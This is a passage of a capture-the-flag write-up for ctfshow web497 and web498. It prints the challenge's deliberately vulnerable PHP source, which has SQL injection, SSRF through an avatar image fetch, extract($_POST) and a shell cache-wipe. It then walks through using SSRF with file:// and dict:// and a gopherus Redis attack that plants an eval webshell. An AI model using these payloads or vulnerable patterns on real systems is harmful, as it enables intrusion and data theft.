class="string">&#x27;index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|or|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;select username,nickname,avatar from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">			<span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line">		<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 05:02:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 </span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 08:40:19</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line">					<span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">					<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">					<span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$filename</span>,<span class="variable">$content</span>,<span class="variable">$append</span> =<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$append</span>)&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>,FILE_APPEND);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:49:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-13 20:02:23</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cache</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">create_cache</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>))&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			file<span class="title class_">Util</span>::<span class="title function_ invoke__">write</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_cache</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_exists</span>(<span class="params"><span class="variable">$template</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$template</span>).<span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>api&#x2F;admin_edit.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413201803657.png" alt="image-20220413201803657"></p>
<p>找到一个修改头像,试试ssrf</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413201900968.png" alt="image-20220413201900968"></p>
<p>使用file协议读取文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413203537687.png" alt="image-20220413203537687"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413203611392.png" alt="image-20220413203611392"></p>
<h1 id="web498"><a href="#web498" class="headerlink" title="web498"></a>web498</h1><p>这次发现flag文件读不成了,但是ssrf还在</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413204553495.png" alt="image-20220413204553495"></p>
<p>我们使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">dict:<span class="comment">//127.0.0.1:80</span></span><br></pre></td></tr></table></figure>

<p>来探测一下本地端口</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413205251454.png" alt="image-20220413205251454"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413205320503.png" alt="image-20220413205320503"></p>
<p>发现6379端口开着,试试ssrf打无密码redis</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopherus --exploit redis</span><br><span class="line">php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zf&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220413205531082.png" alt="image-20220413205531082"></p>
